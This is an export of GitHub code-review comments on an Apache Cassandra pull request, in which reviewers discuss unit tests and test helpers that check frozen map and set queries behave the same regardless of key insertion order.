+        filtered = QueryProcessor.executeInternal(""SELECT * FROM "" + qualifiedTable + "" where k='0' and c={'b_key': 'zv0', 'a_key': 'av0'};"");
+        assertEquals(1, filtered.size());
+        filtered = QueryProcessor.executeInternal(""SELECT * FROM "" + qualifiedTable + "" where k='100' and c={'b_key': 'zv100', 'a_key': 'av100'};"");
+        assertEquals(1, filtered.size());
+        filtered = QueryProcessor.executeInternal(""SELECT * FROM "" + qualifiedTable + "" where k='100' and c={'a_key': 'av100', 'b_key': 'zv100'};"");
+        assertEquals(1, filtered.size());
+    }
+
+    @Test
+    public void testFrozenMapTypeCustomOrdered() throws Exception
+    {
+        // Test to make sure we can write to `date` fields in both old and new formats
+        String schema = ""CREATE TABLE "" + qualifiedTable + "" (""
+                        + ""  k text,""
+                        + ""  c frozen<map<timeuuid, int>>,""
+                        + ""  PRIMARY KEY (k, c)""
+                        + "")"";
+        String insert = ""INSERT INTO "" + qualifiedTable + "" (k, c) VALUES (?, ?)"";
+        CQLSSTableWriter writer = CQLSSTableWriter.builder()
+                                                  .inDirectory(dataDir)
+                                                  .forTable(schema)
+                                                  .using(insert)
+                                                  .withBufferSizeInMiB(1)
+                                                  .build();
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        UUID uuid3 = UUIDs.timeBased();
+        UUID uuid4 = UUIDs.timeBased();
+        Map<UUID, Integer> map = new LinkedHashMap<>();
+        // NOTE: if these two `put` calls are switched, the test passes
+        map.put(uuid2, 2);
+        map.put(uuid1, 1);
+        writer.addRow(String.valueOf(1), map);
+
+        Map<UUID, Integer> map2 = new LinkedHashMap<>();
+        map2.put(uuid3, 1);
+        map2.put(uuid4, 2);
+        writer.addRow(String.valueOf(2), map2);
+
+        writer.close();
+        loadSSTables(dataDir, keyspace);
+
+        UntypedResultSet rs = QueryProcessor.executeInternal(""SELECT * FROM "" + qualifiedTable + "";"");
+        assertEquals(2, rs.size());
+        Map<String, Map<TimeUUID, Integer>> map3 = StreamSupport.stream(rs.spliterator(), false)
+                                                                .collect(Collectors.toMap(r -> r.getString(""k""),
+                                                                                          r -> r.getFrozenMap(""c"",
+                                                                                                              TimeUUIDType.instance,
+                                                                                                              Int32Type.instance)));

Review Comment:
   What's the purpose of this third map?



##########
test/unit/org/apache/cassandra/cql3/validation/operations/InsertTest.java:
##########
@@ -247,4 +252,42 @@ public void testCKInsertWithValueOver64K() throws Throwable
         assertInvalidThrow(InvalidRequestException.class,
                            ""INSERT INTO %s (a, b) VALUES ('foo', ?)"", new String(TOO_BIG.array()));
     }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependent() throws Throwable
+    {
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        createTable(""CREATE TABLE %s (k text, c frozen<map<timeuuid, text>>, PRIMARY KEY (k, c));"");
+        // We use `executeNet` in this test because `execute` passes parameters through CqlTester#transformValues(), which calls
+        // AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.
+        executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid1, ""0"", uuid2, ""1""));
+        executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid2, ""3"", uuid1, ""4""));
+        beforeAndAfterFlush(() -> {
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid1 + "": '0', "" + uuid2 + "": '1'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid2 + "": '1', "" + uuid1 + "": '0'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid1 + "": '4', "" + uuid2 + "": '3'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid2 + "": '3', "" + uuid1 + "": '4'}""), 1);
+        });
+    }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependentWithSelectSlice() throws Throwable
+    {
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        createTable(""CREATE TABLE %s (k text, c frozen<map<timeuuid, text>>, PRIMARY KEY (k, c));"");
+        // We use `executeNet` in this test because `execute` passes parameters through CqlTester#transformValues(), which calls
+        // AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.
+        beforeAndAfterFlush(() -> {
+            executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid2, ""2"", uuid1, ""1""));
+            // This works before the fix because uuid2 was inserted/serialized first
+            assertRowsNet(executeNet(""SELECT k, c["" + uuid2 + ""] from %s""), row(""0"", ""2""));
+            // This fails because uuid1 is < uuid2, but is is serialized after,
+            // we short-circuit the projection once we think we're past the potential map key.
+            // Therefore, the query ends up returning `null` for the map value

Review Comment:
   I would either update or remove the comments of the form ""this works""/""this fails"". These comments are useful in the context of presenting this bugfix but, once we had fixed the bug, the comments are obsolete because the bug is already fixed and the query doesn't fail anymore. 



;16/May/22 15:00;githubbot;600","JeetKunDoug commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r873930262


##########
test/unit/org/apache/cassandra/cql3/CQLTester.java:
##########
@@ -2351,4 +2359,12 @@ public boolean equals(Object o)
                 && Objects.equal(password, u.password);
         }
     }
+
+    protected static <K,V> Map<K,V> buildInsertionOrderedMap(K k1, V v1, K k2, V v2)

Review Comment:
   What do you think about moving the implementation of `map` in this (and fixing up the implementation to take an arbitrary number of parameters), and then delegating `map` to this. The reason I say this is that this method is explicit in its intention to build a specifically-ordered map (which we need for these tests), while `map` doesn't document any contract about the kind of map it produces, even though it happens to do what we need?



;16/May/22 16:26;githubbot;600","JeetKunDoug commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r873934073


##########
test/unit/org/apache/cassandra/cql3/validation/operations/InsertTest.java:
##########
@@ -247,4 +252,42 @@ public void testCKInsertWithValueOver64K() throws Throwable
         assertInvalidThrow(InvalidRequestException.class,
                            ""INSERT INTO %s (a, b) VALUES ('foo', ?)"", new String(TOO_BIG.array()));
     }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependent() throws Throwable

Review Comment:
   I actually originally split the two tests out specifically so we could test inserting with parameterized queries and selecting with parameterized queries specifically (note that each test tests parameterizing a different query). Without this, you could theoretically break one side without being able to test it on the other side.
   I'm happy to move it to `CollectionsTest.java` if you feel it's a more appropriate place for them to live, but I think it's important to make sure there are two different, distinct tests so we cover both.



;16/May/22 16:30;githubbot;600","JeetKunDoug commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r873935315


##########
test/unit/org/apache/cassandra/cql3/validation/operations/InsertTest.java:
##########
@@ -247,4 +252,42 @@ public void testCKInsertWithValueOver64K() throws Throwable
         assertInvalidThrow(InvalidRequestException.class,
                            ""INSERT INTO %s (a, b) VALUES ('foo', ?)"", new String(TOO_BIG.array()));
     }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependent() throws Throwable
+    {
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        createTable(""CREATE TABLE %s (k text, c frozen<map<timeuuid, text>>, PRIMARY KEY (k, c));"");

Review Comment:
   Interestingly, sets already worked because they already used `SortedSet` everywhere... that said, happy to add some tests if we want to make sure we don't later _break_ sets somehow... will wait on the quesiton on where to put them (here or Collections.java) before implementing though.



;16/May/22 16:31;githubbot;600","JeetKunDoug commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r873936984


##########
test/unit/org/apache/cassandra/cql3/validation/operations/InsertTest.java:
##########
@@ -247,4 +252,42 @@ public void testCKInsertWithValueOver64K() throws Throwable
         assertInvalidThrow(InvalidRequestException.class,
                            ""INSERT INTO %s (a, b) VALUES ('foo', ?)"", new String(TOO_BIG.array()));
     }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependent() throws Throwable
+    {
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        createTable(""CREATE TABLE %s (k text, c frozen<map<timeuuid, text>>, PRIMARY KEY (k, c));"");
+        // We use `executeNet` in this test because `execute` passes parameters through CqlTester#transformValues(), which calls
+        // AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.
+        executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid1, ""0"", uuid2, ""1""));
+        executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid2, ""3"", uuid1, ""4""));
+        beforeAndAfterFlush(() -> {
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid1 + "": '0', "" + uuid2 + "": '1'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid2 + "": '1', "" + uuid1 + "": '0'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid1 + "": '4', "" + uuid2 + "": '3'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid2 + "": '3', "" + uuid1 + "": '4'}""), 1);
+        });
+    }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependentWithSelectSlice() throws Throwable
+    {
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        createTable(""CREATE TABLE %s (k text, c frozen<map<timeuuid, text>>, PRIMARY KEY (k, c));"");
+        // We use `executeNet` in this test because `execute` passes parameters through CqlTester#transformValues(), which calls
+        // AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.
+        beforeAndAfterFlush(() -> {
+            executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid2, ""2"", uuid1, ""1""));
+            // This works before the fix because uuid2 was inserted/serialized first
+            assertRowsNet(executeNet(""SELECT k, c["" + uuid2 + ""] from %s""), row(""0"", ""2""));
+            // This fails because uuid1 is < uuid2, but is is serialized after,
+            // we short-circuit the projection once we think we're past the potential map key.
+            // Therefore, the query ends up returning `null` for the map value

Review Comment:
   Fair... will remove them.



;16/May/22 16:33;githubbot;600","JeetKunDoug commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r873936984


##########
test/unit/org/apache/cassandra/cql3/validation/operations/InsertTest.java:
##########
@@ -247,4 +252,42 @@ public void testCKInsertWithValueOver64K() throws Throwable
         assertInvalidThrow(InvalidRequestException.class,
                            ""INSERT INTO %s (a, b) VALUES ('foo', ?)"", new String(TOO_BIG.array()));
     }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependent() throws Throwable
+    {
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        createTable(""CREATE TABLE %s (k text, c frozen<map<timeuuid, text>>, PRIMARY KEY (k, c));"");
+        // We use `executeNet` in this test because `execute` passes parameters through CqlTester#transformValues(), which calls
+        // AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.
+        executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid1, ""0"", uuid2, ""1""));
+        executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid2, ""3"", uuid1, ""4""));
+        beforeAndAfterFlush(() -> {
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid1 + "": '0', "" + uuid2 + "": '1'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid2 + "": '1', "" + uuid1 + "": '0'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid1 + "": '4', "" + uuid2 + "": '3'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid2 + "": '3', "" + uuid1 + "": '4'}""), 1);
+        });
+    }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependentWithSelectSlice() throws Throwable
+    {
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        createTable(""CREATE TABLE %s (k text, c frozen<map<timeuuid, text>>, PRIMARY KEY (k, c));"");
+        // We use `executeNet` in this test because `execute` passes parameters through CqlTester#transformValues(), which calls
+        // AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.
+        beforeAndAfterFlush(() -> {
+            executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid2, ""2"", uuid1, ""1""));
+            // This works before the fix because uuid2 was inserted/serialized first
+            assertRowsNet(executeNet(""SELECT k, c["" + uuid2 + ""] from %s""), row(""0"", ""2""));
+            // This fails because uuid1 is < uuid2, but is is serialized after,
+            // we short-circuit the projection once we think we're past the potential map key.
+            // Therefore, the query ends up returning `null` for the map value

Review Comment:
   Fair... will remove/rewrite them (I think it's worth at least documenting why we try to individually select out each field).



;16/May/22 16:35;githubbot;600","JeetKunDoug commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r873939880


##########
test/unit/org/apache/cassandra/io/sstable/CQLSSTableWriterTest.java:
##########
@@ -947,6 +952,180 @@ public void testDateType() throws Exception
         }
     }
 
+    @Test
+    public void testFrozenMapType() throws Exception
+    {
+        // Test to make sure we can write to `date` fields in both old and new formats
+        String schema = ""CREATE TABLE "" + qualifiedTable + "" (""
+                        + ""  k text,""
+                        + ""  c frozen<map<text, text>>,""
+                        + ""  PRIMARY KEY (k, c)""
+                        + "")"";
+        String insert = ""INSERT INTO "" + qualifiedTable + "" (k, c) VALUES (?, ?)"";
+        CQLSSTableWriter writer = CQLSSTableWriter.builder()
+                                                  .inDirectory(dataDir)
+                                                  .forTable(schema)
+                                                  .using(insert)
+                                                  .withBufferSizeInMiB(1)
+                                                  .build();
+        for (int i = 0; i < 100; i++)
+        {
+            LinkedHashMap<String, String> map = new LinkedHashMap<>();
+            map.put(""a_key"", ""av"" + i);
+            map.put(""b_key"", ""zv"" + i);
+            writer.addRow(String.valueOf(i), map);
+        }
+        for (int i = 100; i < 200; i++)
+        {
+            LinkedHashMap<String, String> map = new LinkedHashMap<>();
+            map.put(""b_key"", ""zv"" + i);
+            map.put(""a_key"", ""av"" + i);
+            writer.addRow(String.valueOf(i), map);
+        }
+        writer.close();
+        loadSSTables(dataDir, keyspace);
+
+        UntypedResultSet rs = QueryProcessor.executeInternal(""SELECT * FROM "" + qualifiedTable + "";"");
+        assertEquals(200, rs.size());
+        Map<String, Map<String, String>> map = StreamSupport.stream(rs.spliterator(), false)
+                                                            .collect(Collectors.toMap(r -> r.getString(""k""), r -> r.getFrozenMap(""c"", UTF8Type.instance, UTF8Type.instance)));
+        for (int i = 0; i < 200; i++)
+        {
+            final String expectedKey = String.valueOf(i);
+            assertTrue(map.containsKey(expectedKey));
+            Map<String, String> innerMap = map.get(expectedKey);
+            assertTrue(innerMap.containsKey(""a_key""));
+            assertEquals(innerMap.get(""a_key""), ""av"" + i);
+            assertTrue(innerMap.containsKey(""b_key""));
+            assertEquals(innerMap.get(""b_key""), ""zv"" + i);
+        }
+
+        // Make sure we can filter with map values regardless of which order we put the keys in
+        UntypedResultSet filtered;
+        filtered = QueryProcessor.executeInternal(""SELECT * FROM "" + qualifiedTable + "" where k='0' and c={'a_key': 'av0', 'b_key': 'zv0'};"");
+        assertEquals(1, filtered.size());
+        filtered = QueryProcessor.executeInternal(""SELECT * FROM "" + qualifiedTable + "" where k='0' and c={'b_key': 'zv0', 'a_key': 'av0'};"");
+        assertEquals(1, filtered.size());
+        filtered = QueryProcessor.executeInternal(""SELECT * FROM "" + qualifiedTable + "" where k='100' and c={'b_key': 'zv100', 'a_key': 'av100'};"");
+        assertEquals(1, filtered.size());
+        filtered = QueryProcessor.executeInternal(""SELECT * FROM "" + qualifiedTable + "" where k='100' and c={'a_key': 'av100', 'b_key': 'zv100'};"");
+        assertEquals(1, filtered.size());
+    }
+
+    @Test
+    public void testFrozenMapTypeCustomOrdered() throws Exception
+    {
+        // Test to make sure we can write to `date` fields in both old and new formats
+        String schema = ""CREATE TABLE "" + qualifiedTable + "" (""
+                        + ""  k text,""
+                        + ""  c frozen<map<timeuuid, int>>,""
+                        + ""  PRIMARY KEY (k, c)""
+                        + "")"";
+        String insert = ""INSERT INTO "" + qualifiedTable + "" (k, c) VALUES (?, ?)"";
+        CQLSSTableWriter writer = CQLSSTableWriter.builder()
+                                                  .inDirectory(dataDir)
+                                                  .forTable(schema)
+                                                  .using(insert)
+                                                  .withBufferSizeInMiB(1)
+                                                  .build();
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        UUID uuid3 = UUIDs.timeBased();
+        UUID uuid4 = UUIDs.timeBased();
+        Map<UUID, Integer> map = new LinkedHashMap<>();
+        // NOTE: if these two `put` calls are switched, the test passes
+        map.put(uuid2, 2);
+        map.put(uuid1, 1);
+        writer.addRow(String.valueOf(1), map);
+
+        Map<UUID, Integer> map2 = new LinkedHashMap<>();
+        map2.put(uuid3, 1);
+        map2.put(uuid4, 2);
+        writer.addRow(String.valueOf(2), map2);
+
+        writer.close();
+        loadSSTables(dataDir, keyspace);
+
+        UntypedResultSet rs = QueryProcessor.executeInternal(""SELECT * FROM "" + qualifiedTable + "";"");
+        assertEquals(2, rs.size());
+        Map<String, Map<TimeUUID, Integer>> map3 = StreamSupport.stream(rs.spliterator(), false)
+                                                                .collect(Collectors.toMap(r -> r.getString(""k""),
+                                                                                          r -> r.getFrozenMap(""c"",
+                                                                                                              TimeUUIDType.instance,
+                                                                                                              Int32Type.instance)));

Review Comment:
   Left-over from some previous asserts I later realized weren't necessary... will remove.



;16/May/22 16:36;githubbot;600","maedhroz commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r874163058


##########
test/unit/org/apache/cassandra/cql3/CQLTester.java:
##########
@@ -1429,6 +1430,13 @@ protected void assertRowsNet(ProtocolVersion protocolVersion, ResultSet result,
                                         rows.length>i ? ""less"" : ""more"", rows.length, i, protocolVersion), i == rows.length);
     }
 
+    protected void assertRowCountNet(ResultSet r1, int expectedCount)
+    {
+        Assert.assertFalse(""Received a null resultset when expected count was > 0"", expectedCount > 0 && r1 == null);
+        final int actualRowCount = Iterables.size(r1);

Review Comment:
   super nit: could ditch the `final`



;16/May/22 21:14;githubbot;600","maedhroz commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r874166544


##########
test/unit/org/apache/cassandra/cql3/CQLTester.java:
##########
@@ -2351,4 +2359,12 @@ public boolean equals(Object o)
                 && Objects.equal(password, u.password);
         }
     }
+
+    protected static <K,V> Map<K,V> buildInsertionOrderedMap(K k1, V v1, K k2, V v2)

Review Comment:
   Why don't we just have `CQLTester#map()` return a `LinkedHashMap`, codifying the behavior it already exhibits?



;16/May/22 21:18;githubbot;600","maedhroz commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r874168343


##########
test/unit/org/apache/cassandra/cql3/validation/operations/InsertTest.java:
##########
@@ -247,4 +252,42 @@ public void testCKInsertWithValueOver64K() throws Throwable
         assertInvalidThrow(InvalidRequestException.class,
                            ""INSERT INTO %s (a, b) VALUES ('foo', ?)"", new String(TOO_BIG.array()));
     }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependent() throws Throwable
+    {
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        createTable(""CREATE TABLE %s (k text, c frozen<map<timeuuid, text>>, PRIMARY KEY (k, c));"");
+        // We use `executeNet` in this test because `execute` passes parameters through CqlTester#transformValues(), which calls
+        // AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.
+        executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid1, ""0"", uuid2, ""1""));
+        executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid2, ""3"", uuid1, ""4""));
+        beforeAndAfterFlush(() -> {
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid1 + "": '0', "" + uuid2 + "": '1'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid2 + "": '1', "" + uuid1 + "": '0'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid1 + "": '4', "" + uuid2 + "": '3'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid2 + "": '3', "" + uuid1 + "": '4'}""), 1);
+        });
+    }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependentWithSelectSlice() throws Throwable
+    {
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        createTable(""CREATE TABLE %s (k text, c frozen<map<timeuuid, text>>, PRIMARY KEY (k, c));"");
+        // We use `executeNet` in this test because `execute` passes parameters through CqlTester#transformValues(), which calls
+        // AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.
+        beforeAndAfterFlush(() -> {
+            executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid2, ""2"", uuid1, ""1""));
+            // This works before the fix because uuid2 was inserted/serialized first
+            assertRowsNet(executeNet(""SELECT k, c["" + uuid2 + ""] from %s""), row(""0"", ""2""));
+            // This fails because uuid1 is < uuid2, but is is serialized after,
+            // we short-circuit the projection once we think we're past the potential map key.
+            // Therefore, the query ends up returning `null` for the map value

Review Comment:
   Fair. What I usually do is tell the story. For example...
   
   > Before CASSANDRA-17623, this failed, because uuid1 is < uuid2 but was serialized after...



;16/May/22 21:21;githubbot;600","JeetKunDoug commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r874169514


##########
test/unit/org/apache/cassandra/cql3/CQLTester.java:
##########
@@ -2351,4 +2359,12 @@ public boolean equals(Object o)
                 && Objects.equal(password, u.password);
         }
     }
+
+    protected static <K,V> Map<K,V> buildInsertionOrderedMap(K k1, V v1, K k2, V v2)

Review Comment:
   I suppose, to me, unless the method name/comments/something explicitly say _why_ it's returning a LinkedHashMap, someone else could easily come along next year and go ""huh, this new Java 22 thing would totally replace this method, so I may as well just use it instead - no reason we have to use a LinkedHashMap here anyway..."" I suppose we could document that we expect the return value from `map` to be iterable in insertion order via code comments as well, but then you can never change `map` (which otherwise seems really generic and has no need for in-order iteration) without then adding this new method with a different behavior, and then figuring out where it would break tests. If we have a method (maybe rename this one to `inOrderMap`?) that `map` delegates to, if we ever want to touch `map` we can just split it out without breaking the original purpose of having the map be explicitly an in order traversable map?



;16/May/22 21:23;githubbot;600","maedhroz commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r874174098


##########
test/unit/org/apache/cassandra/cql3/CQLTester.java:
##########
@@ -2351,4 +2359,12 @@ public boolean equals(Object o)
                 && Objects.equal(password, u.password);
         }
     }
+
+    protected static <K,V> Map<K,V> buildInsertionOrderedMap(K k1, V v1, K k2, V v2)

Review Comment:
   I'd be cool w/ just renaming `map()` -> `linkedHashMap()` (that returns a `LinkedHashMap`) and then adding back a `map()` method, so we can avoid renaming for dozens of existing call-sites.



;16/May/22 21:30;githubbot;600","JeetKunDoug commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r874784439


##########
test/unit/org/apache/cassandra/cql3/validation/operations/InsertTest.java:
##########
@@ -247,4 +252,42 @@ public void testCKInsertWithValueOver64K() throws Throwable
         assertInvalidThrow(InvalidRequestException.class,
                            ""INSERT INTO %s (a, b) VALUES ('foo', ?)"", new String(TOO_BIG.array()));
     }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependent() throws Throwable

Review Comment:
   Moving all of these tests, plus the new ones for sets, into CollectionTests.



;17/May/22 13:01;githubbot;600","JeetKunDoug commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r874845223


##########
test/unit/org/apache/cassandra/cql3/validation/operations/InsertTest.java:
##########
@@ -247,4 +252,42 @@ public void testCKInsertWithValueOver64K() throws Throwable
         assertInvalidThrow(InvalidRequestException.class,
                            ""INSERT INTO %s (a, b) VALUES ('foo', ?)"", new String(TOO_BIG.array()));
     }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependent() throws Throwable
+    {
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        createTable(""CREATE TABLE %s (k text, c frozen<map<timeuuid, text>>, PRIMARY KEY (k, c));"");
+        // We use `executeNet` in this test because `execute` passes parameters through CqlTester#transformValues(), which calls
+        // AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.
+        executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid1, ""0"", uuid2, ""1""));
+        executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid2, ""3"", uuid1, ""4""));
+        beforeAndAfterFlush(() -> {
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid1 + "": '0', "" + uuid2 + "": '1'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid2 + "": '1', "" + uuid1 + "": '0'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid1 + "": '4', "" + uuid2 + "": '3'}""), 1);
+            assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid2 + "": '3', "" + uuid1 + "": '4'}""), 1);
+        });
+    }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependentWithSelectSlice() throws Throwable
+    {
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        createTable(""CREATE TABLE %s (k text, c frozen<map<timeuuid, text>>, PRIMARY KEY (k, c));"");
+        // We use `executeNet` in this test because `execute` passes parameters through CqlTester#transformValues(), which calls
+        // AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.
+        beforeAndAfterFlush(() -> {
+            executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", buildInsertionOrderedMap(uuid2, ""2"", uuid1, ""1""));
+            // This works before the fix because uuid2 was inserted/serialized first
+            assertRowsNet(executeNet(""SELECT k, c["" + uuid2 + ""] from %s""), row(""0"", ""2""));
+            // This fails because uuid1 is < uuid2, but is is serialized after,
+            // we short-circuit the projection once we think we're past the potential map key.
+            // Therefore, the query ends up returning `null` for the map value

Review Comment:
   Added a narrative at the top of the new set of tests in CollectionsTest and a marker at the end of those tests specifying they were all for CASSANDRA-17623, which also allowed me to remove some of the duplicated comments in the tests themselves.



;17/May/22 13:52;githubbot;600","JeetKunDoug commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r874847527


##########
test/unit/org/apache/cassandra/cql3/CQLTester.java:
##########
@@ -2351,4 +2359,12 @@ public boolean equals(Object o)
                 && Objects.equal(password, u.password);
         }
     }
+
+    protected static <K,V> Map<K,V> buildInsertionOrderedMap(K k1, V v1, K k2, V v2)

Review Comment:
   Did what @maedhroz suggested, and added a comment above `linkedHashMap()` to explain that some tests require in-order enumeration of maps so it make sense to someone who sees the two and thinks ""I'll just inline this"" in case we later want to, for example, add a `sortedHashMap` method or something else more specific.



;17/May/22 13:54;githubbot;600","adelapena commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r875089400


##########
test/unit/org/apache/cassandra/cql3/CQLTester.java:
##########
@@ -2120,13 +2128,26 @@ protected Object set(Object...values)
         return ImmutableSet.copyOf(values);
     }
 
+    protected LinkedHashSet<Object> linkedHashSet(Object...values)

Review Comment:
   This could have a comment/JavaDoc analogous to the one in `linkedHashMap`



##########
test/unit/org/apache/cassandra/cql3/CQLTester.java:
##########
@@ -2351,4 +2372,5 @@ public boolean equals(Object o)
                 && Objects.equal(password, u.password);
         }
     }
+

Review Comment:
   Nit: unneeded blank line



##########
test/unit/org/apache/cassandra/io/sstable/CQLSSTableWriterTest.java:
##########
@@ -45,6 +46,9 @@
 import org.apache.cassandra.cql3.functions.types.*;
 import org.apache.cassandra.db.Keyspace;
 import org.apache.cassandra.db.commitlog.CommitLog;
+import org.apache.cassandra.db.marshal.Int32Type;
+import org.apache.cassandra.db.marshal.TimeUUIDType;

Review Comment:
   Nit: unneeded imports



##########
test/unit/org/apache/cassandra/io/sstable/CQLSSTableWriterTest.java:
##########
@@ -947,6 +952,172 @@ public void testDateType() throws Exception
         }
     }
 
+    @Test
+    public void testFrozenMapType() throws Exception
+    {
+        // Test to make sure we can write to `date` fields in both old and new formats
+        String schema = ""CREATE TABLE "" + qualifiedTable + "" (""
+                        + ""  k text,""
+                        + ""  c frozen<map<text, text>>,""
+                        + ""  PRIMARY KEY (k, c)""
+                        + "")"";
+        String insert = ""INSERT INTO "" + qualifiedTable + "" (k, c) VALUES (?, ?)"";
+        CQLSSTableWriter writer = CQLSSTableWriter.builder()
+                                                  .inDirectory(dataDir)
+                                                  .forTable(schema)
+                                                  .using(insert)
+                                                  .withBufferSizeInMiB(1)
